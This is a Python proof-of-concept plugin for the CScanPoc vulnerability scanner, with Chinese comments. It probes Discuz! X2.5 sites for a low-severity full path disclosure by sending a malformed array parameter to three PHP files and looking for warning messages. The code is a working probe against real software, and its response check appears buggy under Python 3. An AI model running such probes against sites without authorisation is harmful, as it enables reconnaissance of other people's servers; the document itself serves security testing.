# coding: utf-8
import urllib.request
import urllib.error
import urllib.parse

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Discuz_0121'  # 平台漏洞编号，留空
    name = 'Discuz X2.5 full Path Disclosure Vulnerability'  # 漏洞名称
    level = VulnLevel.LOW  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2014-10-17'  # 漏洞公布时间
    desc = '''
    Discuz! X2.5 /api.php文件中由于array_key_exists中的第一个参数只能为整数或者字符串，当?mod[]=beebeeto时，$mod类型为array，从而导致array_key_exists产生错误信息。
    '''  # 漏洞描述
    ref = 'http://www.cnseay.com/archives/2353'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Discuz!'  # 漏洞应用名称
    product_version = '2.5'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'eb666ffe-8a2d-42ba-bd94-fba47b1398cd'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            file_list = ['/api.php', '/uc_server/control/admin/db.php',
                         '/install/include/install_lang.php']
            for filename in file_list:
                verify_url = self.target + filename + '?mod[]=beebeeto'
                try:
                    req = urllib.request.urlopen(verify_url)
                    content = req.read()
                except:
                    continue
                if 'Warning:' in content and 'array_key_exists():' in content:
                    if '.php on line' in content:
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
